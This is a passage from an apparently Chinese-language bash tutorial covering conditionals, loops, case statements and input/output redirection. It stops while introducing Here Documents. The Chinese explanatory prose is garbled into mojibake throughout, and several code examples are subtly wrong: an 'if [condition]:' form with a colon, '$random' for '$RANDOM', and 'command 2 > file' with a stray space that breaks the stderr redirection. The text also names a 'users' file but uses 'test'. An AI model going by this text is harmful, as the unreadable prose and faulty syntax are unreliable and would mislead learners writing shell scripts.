<h3 id="å…¶ä»–å‘½ä»¤ä¸å˜é‡">å…¶ä»–å‘½ä»¤ä¸å˜é‡</h3>
<p><strong>å‘½ä»¤</strong></p>
<p>usleep --å¾®ç§’</p>
<p>sleep --ç§’ä¸ºå•ä½</p>
<p>exit     é€€å‡ºæ•´ä¸ªè„šæœ¬çš„è¿è¡Œï¼ˆç»ˆæ­¢è„šæœ¬ç»§ç»­è¿è¡Œï¼‰</p>
<p>unset  å–æ¶ˆå˜é‡</p>
<p><strong>å˜é‡</strong></p>
<p>$random éšæœºæ•°</p>
<h2 id="Shell-æµç¨‹æ§åˆ¶">Shell æµç¨‹æ§åˆ¶</h2>
<p>é€šå¸¸ï¼Œåœ¨bashçš„å„ç§æ¡ä»¶ç»“æ„å’Œæµç¨‹æ§åˆ¶ç»“æ„ä¸­éƒ½è¦è¿›è¡Œå„ç§æ£€éªŒï¼Œç„¶åæ ¹æ®æ£€éªŒç»“æœæ‰§è¡Œä¸åŒçš„æ“ä½œï¼›</p>
<h3 id="if-elseåˆ¤æ–­è¯­å¥">if elseåˆ¤æ–­è¯­å¥</h3>
<p>if è¯­å¥è¯­æ³•æ ¼å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [condition]:</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    command1 </span><br><span class="line">    ...</span><br><span class="line">    commandN </span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>åœ¨ç»ˆç«¯å¯ä»¥å°†å‘½ä»¤å†™æˆä¸€è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ $(ps -ef | grep -c <span class="string">&quot;ssh&quot;</span>) -gt 1 ]; <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;true&quot;</span>; <span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>if else è¯­æ³•æ ¼å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>if else-if else è¯­æ³•æ ¼å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition1</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    command1</span><br><span class="line">    ......</span><br><span class="line"><span class="keyword">elif</span> condition2 </span><br><span class="line"><span class="keyword">then</span> </span><br><span class="line">    command2</span><br><span class="line">    ......</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    commandN</span><br><span class="line">    ......</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>if elseè¯­å¥ç»å¸¸ä¸testå‘½ä»¤ç»“åˆä½¿ç”¨ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">num1=$[2*3]</span><br><span class="line">num2=$[1+5]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> $[num1] -eq $[num2]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;ä¸¤ä¸ªæ•°å­—ç›¸ç­‰!&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;ä¸¤ä¸ªæ•°å­—ä¸ç›¸ç­‰!&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è¾“å‡ºç»“æœï¼š</span></span><br><span class="line">ä¸¤ä¸ªæ•°å­—ç›¸ç­‰!</span><br></pre></td></tr></table></figure>
<h3 id="forå¾ªç¯">forå¾ªç¯</h3>
<p>forå¾ªç¯ä¸€èˆ¬æ ¼å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> item1 item2 ... itemN</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    command1</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>Cè¯­è¨€æ–¹å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ((exp1;exp2;exp3))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  command1</span><br><span class="line">  ......</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>å†™æˆä¸€è¡Œï¼ˆæ–¹ä¾¿åœ¨ç»ˆç«¯æ‰§è¡Œï¼‰ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> item1 item2 ... itemN; <span class="keyword">do</span> command1; command2â€¦ <span class="keyword">done</span>;</span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#é¡ºåºè¾“å‡ºå½“å‰åˆ—è¡¨ä¸­çš„æ•°å­—</span></span><br><span class="line"><span class="keyword">for</span> loop <span class="keyword">in</span> 1 2 3 4 5</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;The value is: <span class="variable">$loop</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="comment">#è¾“å‡ºç»“æœï¼š</span></span><br><span class="line">The value is: 1</span><br><span class="line">The value is: 2</span><br><span class="line">The value is: 3</span><br><span class="line">The value is: 4</span><br><span class="line">The value is: 5</span><br><span class="line"></span><br><span class="line"><span class="comment">#é¡ºåºè¾“å‡ºå­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ï¼š</span></span><br><span class="line"><span class="keyword">for</span> str <span class="keyword">in</span> <span class="string">&#x27;This is a string&#x27;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$str</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="comment">#è¾“å‡ºç»“æœï¼š</span></span><br><span class="line">This is a string</span><br><span class="line"></span><br><span class="line"><span class="comment">#Cè¯­è¨€æ–¹å¼</span></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">1</span>;i&lt;=<span class="number">5</span>;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$i</span> \c&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#è¾“å‡ºç»“æœï¼š</span></span><br><span class="line">1 2 3 4 5 </span><br></pre></td></tr></table></figure>
<h3 id="whileå¾ªç¯">whileå¾ªç¯</h3>
<p>whileå¾ªç¯æ ¼å¼ä¸ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> condition</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>whileå¾ªç¯å¯ç”¨äºè¯»å–é”®ç›˜ä¿¡æ¯ã€‚ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œè¾“å…¥ä¿¡æ¯è¢«è®¾ç½®ä¸ºå˜é‡FILMï¼ŒæŒ‰<code>Ctrl-D</code>ç»“æŸå¾ªç¯ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;æŒ‰ä¸‹ &lt;CTRL-D&gt; é€€å‡º&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;è¾“å…¥ä½ æœ€å–œæ¬¢çš„ç½‘ç«™å: &#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> FILM</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;æ˜¯çš„ï¼<span class="variable">$FILM</span> æ˜¯ä¸€ä¸ªå¥½ç½‘ç«™&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>è¿è¡Œè„šæœ¬ï¼Œè¾“å‡ºç±»ä¼¼ä¸‹é¢ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">æŒ‰ä¸‹ <span class="tag">&lt;<span class="name">CTRL-D</span>&gt;</span> é€€å‡º</span><br><span class="line">è¾“å…¥ä½ æœ€å–œæ¬¢çš„ç½‘ç«™å:æ·˜å®</span><br><span class="line">æ˜¯çš„ï¼æ·˜å® æ˜¯ä¸€ä¸ªå¥½ç½‘ç«™</span><br></pre></td></tr></table></figure>
<h3 id="æ— é™å¾ªç¯">æ— é™å¾ªç¯</h3>
<p>æ— é™å¾ªç¯è¯­æ³•æ ¼å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> :           <span class="comment">#  ä¸‰ç§æ–¹æ³•å‡å¯</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>        <span class="comment">#  ä¸‰ç§æ–¹æ³•å‡å¯ </span></span><br><span class="line"><span class="keyword">for</span> (( ; ; ))     <span class="comment">#  ä¸‰ç§æ–¹æ³•å‡å¯</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h3 id="until-å¾ªç¯">until å¾ªç¯</h3>
<p>until å¾ªç¯æ‰§è¡Œä¸€ç³»åˆ—å‘½ä»¤ç›´è‡³æ¡ä»¶ä¸º true æ—¶åœæ­¢ï¼Œä¸ while å¾ªç¯åœ¨å¤„ç†æ–¹å¼ä¸Šåˆšå¥½ç›¸åã€‚</p>
<p>ä¸€èˆ¬ while å¾ªç¯ä¼˜äº until å¾ªç¯ï¼Œä½†åœ¨æŸäº›æ—¶å€™â€”â€”ä¹Ÿåªæ˜¯æå°‘æ•°æƒ…å†µä¸‹ï¼Œuntil å¾ªç¯æ›´åŠ æœ‰ç”¨ã€‚</p>
<p>until è¯­æ³•æ ¼å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">until</span> condition</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>condition ä¸ºæ¡ä»¶è¡¨è¾¾å¼ï¼Œå¦‚æœè¿”å›å€¼ä¸º falseï¼Œåˆ™ç»§ç»­æ‰§è¡Œå¾ªç¯ä½“å†…çš„è¯­å¥ï¼Œå¦åˆ™è·³å‡ºå¾ªç¯ã€‚</p>
<p>ä»¥ä¸‹å®ä¾‹æˆ‘ä»¬ä½¿ç”¨ until å‘½ä»¤æ¥è¾“å‡º 0 ~ 9 çš„æ•°å­—ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">a=0</span><br><span class="line"><span class="keyword">until</span> [ ! <span class="variable">$a</span> -lt 10 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$a</span></span><br><span class="line">   a=`<span class="built_in">expr</span> <span class="variable">$a</span> + 1`</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h3 id="å¾ªç¯æ§åˆ¶è¯­å¥"><strong>å¾ªç¯æ§åˆ¶è¯­å¥</strong></h3>
<p>åœ¨å¾ªç¯è¿‡ç¨‹ä¸­ï¼Œæœ‰æ—¶å€™éœ€è¦åœ¨æœªè¾¾åˆ°å¾ªç¯ç»“æŸæ¡ä»¶æ—¶å¼ºåˆ¶è·³å‡ºå¾ªç¯ï¼ŒShellä½¿ç”¨ä¸¤ä¸ªå‘½ä»¤æ¥å®ç°è¯¥åŠŸèƒ½ï¼šbreakå’Œcontinueã€‚</p>
<p>breakå‘½ä»¤å…è®¸è·³å‡ºæ‰€æœ‰å¾ªç¯ï¼ˆç»ˆæ­¢æ‰§è¡Œåé¢çš„æ‰€æœ‰å¾ªç¯ï¼‰ã€‚</p>
<p>ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œè„šæœ¬è¿›å…¥æ­»å¾ªç¯ç›´è‡³ç”¨æˆ·è¾“å…¥æ•°å­—å¤§äº5ã€‚è¦è·³å‡ºè¿™ä¸ªå¾ªç¯ï¼Œè¿”å›åˆ°shellæç¤ºç¬¦ä¸‹ï¼Œéœ€è¦ä½¿ç”¨breakå‘½ä»¤ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">&quot;è¾“å…¥ 1 åˆ° 5 ä¹‹é—´çš„æ•°å­—:&quot;</span></span><br><span class="line">    <span class="built_in">read</span> aNum</span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$aNum</span> <span class="keyword">in</span></span><br><span class="line">        1|2|3|4|5) <span class="built_in">echo</span> <span class="string">&quot;ä½ è¾“å…¥çš„æ•°å­—ä¸º <span class="variable">$aNum</span>!&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">        *) <span class="built_in">echo</span> <span class="string">&quot;ä½ è¾“å…¥çš„æ•°å­—ä¸æ˜¯ 1 åˆ° 5 ä¹‹é—´çš„! æ¸¸æˆç»“æŸ&quot;</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œä»¥ä¸Šä»£ç ï¼Œè¾“å‡ºç»“æœä¸ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥ 1 åˆ° 5 ä¹‹é—´çš„æ•°å­—:3</span><br><span class="line">ä½ è¾“å…¥çš„æ•°å­—ä¸º 3!</span><br><span class="line">è¾“å…¥ 1 åˆ° 5 ä¹‹é—´çš„æ•°å­—:7</span><br><span class="line">ä½ è¾“å…¥çš„æ•°å­—ä¸æ˜¯ 1 åˆ° 5 ä¹‹é—´çš„! æ¸¸æˆç»“æŸ</span><br></pre></td></tr></table></figure>
<p>continueå‘½ä»¤ä¸breakå‘½ä»¤ç±»ä¼¼ï¼Œåªæœ‰ä¸€ç‚¹å·®åˆ«ï¼Œå®ƒä¸ä¼šè·³å‡ºæ‰€æœ‰å¾ªç¯ï¼Œä»…ä»…è·³å‡ºå½“å‰å¾ªç¯ã€‚</p>
<h3 id="case">case</h3>
<p>Shell caseè¯­å¥ä¸ºå¤šé€‰æ‹©è¯­å¥ã€‚å¯ä»¥ç”¨caseè¯­å¥åŒ¹é…ä¸€ä¸ªå€¼ä¸ä¸€ä¸ªæ¨¡å¼ï¼Œå¦‚æœåŒ¹é…æˆåŠŸï¼Œæ‰§è¡Œç›¸åŒ¹é…çš„å‘½ä»¤ã€‚caseè¯­å¥æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> å€¼ <span class="keyword">in</span></span><br><span class="line">æ¨¡å¼1)</span><br><span class="line">    command1</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">    ;;</span><br><span class="line">æ¨¡å¼2ï¼‰</span><br><span class="line">    command1</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">	command1</span><br><span class="line">	.....</span><br><span class="line">	commandn</span><br><span class="line">	;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢çš„è„šæœ¬æç¤ºè¾“å…¥1åˆ°4ï¼Œä¸æ¯ä¸€ç§æ¨¡å¼è¿›è¡ŒåŒ¹é…ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;è¾“å…¥ 1 åˆ° 4 ä¹‹é—´çš„æ•°å­—:&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;ä½ è¾“å…¥çš„æ•°å­—ä¸º:&#x27;</span></span><br><span class="line"><span class="built_in">read</span> aNum</span><br><span class="line"><span class="keyword">case</span> <span class="variable">$aNum</span> <span class="keyword">in</span></span><br><span class="line">    1)  <span class="built_in">echo</span> <span class="string">&#x27;ä½ é€‰æ‹©äº† 1&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line">    2)  <span class="built_in">echo</span> <span class="string">&#x27;ä½ é€‰æ‹©äº† 2&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line">    3)  <span class="built_in">echo</span> <span class="string">&#x27;ä½ é€‰æ‹©äº† 3&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line">    4)  <span class="built_in">echo</span> <span class="string">&#x27;ä½ é€‰æ‹©äº† 4&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line">    *)  <span class="built_in">echo</span> <span class="string">&#x27;ä½ æ²¡æœ‰è¾“å…¥ 1 åˆ° 4 ä¹‹é—´çš„æ•°å­—&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="comment">#è¾“å…¥ä¸åŒçš„å†…å®¹ï¼Œä¼šæœ‰ä¸åŒçš„ç»“æœï¼Œä¾‹å¦‚ï¼š</span></span><br><span class="line">è¾“å…¥ 1 åˆ° 4 ä¹‹é—´çš„æ•°å­—:</span><br><span class="line">ä½ è¾“å…¥çš„æ•°å­—ä¸º:</span><br><span class="line">3</span><br><span class="line">ä½ é€‰æ‹©äº† 3</span><br></pre></td></tr></table></figure>
<h2 id="Shellè¾“å…¥-è¾“å‡ºé‡å®šå‘">Shellè¾“å…¥/è¾“å‡ºé‡å®šå‘</h2>
<p>é‡å®šå‘å‘½ä»¤åˆ—è¡¨å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>command &gt; file</td>
<td>å°†è¾“å‡ºé‡å®šå‘åˆ° fileã€‚</td>
</tr>
<tr>
<td>command &lt; file</td>
<td>å°†è¾“å…¥é‡å®šå‘åˆ° fileã€‚</td>
</tr>
<tr>
<td>command &gt;&gt; file</td>
<td>å°†è¾“å‡ºä»¥è¿½åŠ çš„æ–¹å¼é‡å®šå‘åˆ° fileã€‚</td>
</tr>
<tr>
<td>n &gt; file</td>
<td>å°†æ–‡ä»¶æè¿°ç¬¦ä¸º n çš„æ–‡ä»¶é‡å®šå‘åˆ° fileã€‚</td>
</tr>
<tr>
<td>n &gt;&gt; file</td>
<td>å°†æ–‡ä»¶æè¿°ç¬¦ä¸º n çš„æ–‡ä»¶ä»¥è¿½åŠ çš„æ–¹å¼é‡å®šå‘åˆ° fileã€‚</td>
</tr>
<tr>
<td>n &gt;&amp; m</td>
<td>å°†è¾“å‡ºæ–‡ä»¶ m å’Œ n åˆå¹¶ã€‚</td>
</tr>
<tr>
<td>n &lt;&amp; m</td>
<td>å°†è¾“å…¥æ–‡ä»¶ m å’Œ n åˆå¹¶ã€‚</td>
</tr>
<tr>
<td>&lt;&lt; tag</td>
<td>å°†å¼€å§‹æ ‡è®° tag å’Œç»“æŸæ ‡è®° tag ä¹‹é—´çš„å†…å®¹ä½œä¸ºè¾“å…¥ã€‚</td>
</tr>
</tbody>
</table>
<blockquote>
<p>éœ€è¦æ³¨æ„çš„æ˜¯æ–‡ä»¶æè¿°ç¬¦ 0 é€šå¸¸æ˜¯æ ‡å‡†è¾“å…¥ï¼ˆSTDINï¼‰ï¼Œ1 æ˜¯æ ‡å‡†è¾“å‡ºï¼ˆSTDOUTï¼‰ï¼Œ2 æ˜¯æ ‡å‡†é”™è¯¯è¾“å‡ºï¼ˆSTDERRï¼‰ã€‚</p>
</blockquote>
<hr>
<h3 id="è¾“å‡ºé‡å®šå‘">è¾“å‡ºé‡å®šå‘</h3>
<p>é‡å®šå‘ä¸€èˆ¬é€šè¿‡åœ¨å‘½ä»¤é—´æ’å…¥ç‰¹å®šçš„ç¬¦å·æ¥å®ç°ã€‚ç‰¹åˆ«çš„ï¼Œè¿™äº›ç¬¦å·çš„è¯­æ³•å¦‚ä¸‹æ‰€ç¤º:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">command1 &gt; file1</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢è¿™ä¸ªå‘½ä»¤æ‰§è¡Œcommand1ç„¶åå°†è¾“å‡ºçš„å†…å®¹å­˜å…¥file1ã€‚</p>
<p>æ³¨æ„ä»»ä½•file1å†…çš„å·²ç»å­˜åœ¨çš„å†…å®¹å°†è¢«æ–°å†…å®¹æ›¿ä»£ã€‚å¦‚æœè¦å°†æ–°å†…å®¹æ·»åŠ åœ¨æ–‡ä»¶æœ«å°¾ï¼Œè¯·ä½¿ç”¨&gt;&gt;æ“ä½œç¬¦ã€‚</p>
<p>è¾“å‡ºé‡å®šå‘ä¼šè¦†ç›–æ–‡ä»¶å†…å®¹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;www.baidu.com&quot;</span> &gt; <span class="built_in">users</span></span><br><span class="line">$ <span class="built_in">cat</span> <span class="built_in">users</span></span><br><span class="line">www.baidu.com</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<p>å¦‚æœä¸å¸Œæœ›æ–‡ä»¶å†…å®¹è¢«è¦†ç›–ï¼Œå¯ä»¥ä½¿ç”¨ &gt;&gt; è¿½åŠ åˆ°æ–‡ä»¶æœ«å°¾ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;www.baidu.com&quot;</span> &gt;&gt; <span class="built_in">users</span></span><br><span class="line">$ <span class="built_in">cat</span> <span class="built_in">users</span></span><br><span class="line">www.baidu.com</span><br><span class="line">www.baidu.com</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h3 id="è¾“å…¥é‡å®šå‘">è¾“å…¥é‡å®šå‘</h3>
<p>å’Œè¾“å‡ºé‡å®šå‘ä¸€æ ·ï¼ŒUnix å‘½ä»¤ä¹Ÿå¯ä»¥ä»æ–‡ä»¶è·å–è¾“å…¥ï¼Œè¯­æ³•ä¸ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">command1 &lt; file1</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·ï¼Œæœ¬æ¥éœ€è¦ä»é”®ç›˜è·å–è¾“å…¥çš„å‘½ä»¤ä¼šè½¬ç§»åˆ°æ–‡ä»¶è¯»å–å†…å®¹ã€‚</p>
<p>æ³¨æ„ï¼šè¾“å‡ºé‡å®šå‘æ˜¯å¤§äºå·(&gt;)ï¼Œè¾“å…¥é‡å®šå‘æ˜¯å°äºå·(&lt;)ã€‚</p>
<p>ç»Ÿè®¡ users æ–‡ä»¶çš„è¡Œæ•°,æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ <span class="built_in">wc</span> -l <span class="built_in">test</span> </span><br><span class="line">4 <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå¯ä»¥å°†è¾“å…¥é‡å®šå‘åˆ° users æ–‡ä»¶ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ <span class="built_in">wc</span> -l &lt;<span class="built_in">test</span></span><br><span class="line">4</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ï¼šä¸Šé¢ä¸¤ä¸ªä¾‹å­çš„ç»“æœä¸åŒï¼šç¬¬ä¸€ä¸ªä¾‹å­ï¼Œä¼šè¾“å‡ºæ–‡ä»¶åï¼›ç¬¬äºŒä¸ªä¸ä¼šï¼Œå› ä¸ºå®ƒä»…ä»…çŸ¥é“ä»æ ‡å‡†è¾“å…¥è¯»å–å†…å®¹ã€‚</p>
<p>åŒæ—¶æ›¿æ¢è¾“å…¥å’Œè¾“å‡ºï¼Œæ‰§è¡Œcommand1ï¼Œä»æ–‡ä»¶infileè¯»å–å†…å®¹ï¼Œç„¶åå°†è¾“å‡ºå†™å…¥åˆ°outfileä¸­:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">command1 &lt; infile &gt; outfile</span><br></pre></td></tr></table></figure>
<h3 id="é‡å®šå‘æ·±å…¥è®²è§£">é‡å®šå‘æ·±å…¥è®²è§£</h3>
<p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ¯ä¸ª Unix/Linux å‘½ä»¤è¿è¡Œæ—¶éƒ½ä¼šæ‰“å¼€ä¸‰ä¸ªæ–‡ä»¶ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>æ ‡å‡†è¾“å…¥æ–‡ä»¶(stdin)ï¼šstdinçš„æ–‡ä»¶æè¿°ç¬¦ä¸º0ï¼ŒUnixç¨‹åºé»˜è®¤ä»stdinè¯»å–æ•°æ®ã€‚</p>
</li>
<li class="lvl-2">
<p>æ ‡å‡†è¾“å‡ºæ–‡ä»¶(stdout)ï¼šstdout çš„æ–‡ä»¶æè¿°ç¬¦ä¸º1ï¼ŒUnixç¨‹åºé»˜è®¤å‘stdoutè¾“å‡ºæ•°æ®ã€‚</p>
</li>
<li class="lvl-2">
<p>æ ‡å‡†é”™è¯¯æ–‡ä»¶(stderr)ï¼šstderrçš„æ–‡ä»¶æè¿°ç¬¦ä¸º2ï¼ŒUnixç¨‹åºä¼šå‘stderræµä¸­å†™å…¥é”™è¯¯ä¿¡æ¯ã€‚</p>
</li>
</ul>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œcommand &gt; file å°† stdout é‡å®šå‘åˆ° fileï¼Œcommand &lt; file å°†stdin é‡å®šå‘åˆ° fileã€‚</p>
<p>å¦‚æœå¸Œæœ› stderr é‡å®šå‘åˆ° fileï¼Œå¯ä»¥è¿™æ ·å†™ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">command</span> 2 &gt; file</span><br></pre></td></tr></table></figure>
<p>å¦‚æœå¸Œæœ› stderr è¿½åŠ åˆ° file æ–‡ä»¶æœ«å°¾ï¼Œå¯ä»¥è¿™æ ·å†™ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">command</span> 2 &gt;&gt; file</span><br></pre></td></tr></table></figure>
<p><strong>2</strong> è¡¨ç¤ºæ ‡å‡†é”™è¯¯æ–‡ä»¶(stderr)ã€‚</p>
<p>å¦‚æœå¸Œæœ›å°† stdout å’Œ stderr åˆå¹¶åé‡å®šå‘åˆ° fileï¼Œå¯ä»¥è¿™æ ·å†™ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">command</span> &gt; file 2&gt;&amp;1</span><br><span class="line">æˆ–è€…</span><br><span class="line">$ <span class="built_in">command</span> &gt;&gt; file 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>å¦‚æœå¸Œæœ›å¯¹ stdin å’Œ stdout éƒ½é‡å®šå‘ï¼Œå¯ä»¥è¿™æ ·å†™ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">command</span> &lt; file1 &gt;file2</span><br></pre></td></tr></table></figure>
<p>command å‘½ä»¤å°† stdin é‡å®šå‘åˆ° file1ï¼Œå°† stdout é‡å®šå‘åˆ° file2ã€‚</p>
<h3 id="Here-Document">Here Document</h3>
<p>Here Document æ˜¯ Shell ä¸­çš„ä¸€ç§ç‰¹æ®Šçš„é‡å®šå‘æ–¹å¼ï¼Œç”¨æ¥å°†è¾“å…¥é‡å®šå‘åˆ°ä¸€ä¸ªäº¤äº’å¼ Shell è„šæœ¬æˆ–ç¨‹åºã€‚</p>
<p>å®ƒçš„åŸºæœ¬çš„å½¢å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> &lt;&lt; <span class="string">delimiter</span></span><br><span class="line"><span class="string">    document</span></span><br><span class="line"><span class="string">delimiter</span></span><br></pre></td></tr></table></figure>
<p>å®ƒçš„ä½œç”¨æ˜¯å°†ä¸¤ä¸ª delimiter ä¹‹é—´çš„å†…å®¹(document) ä½œä¸ºè¾“å…¥ä¼ é€’ç»™ commandã€‚</p>
<p>æ³¨æ„ï¼šç»“å°¾çš„delimiter ä¸€å®šè¦é¡¶æ ¼å†™ï¼Œå‰é¢ä¸èƒ½æœ‰ä»»ä½•å­—ç¬¦ï¼Œåé¢ä¹Ÿä¸èƒ½æœ‰ä»»ä½•å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼å’Œ tab ç¼©è¿›ã€‚</p>
<p>åœ¨å‘½ä»¤è¡Œä¸­é€šè¿‡ wc -l å‘½ä»¤è®¡ç®— Here Document çš„è¡Œæ•°ï¼š</p>
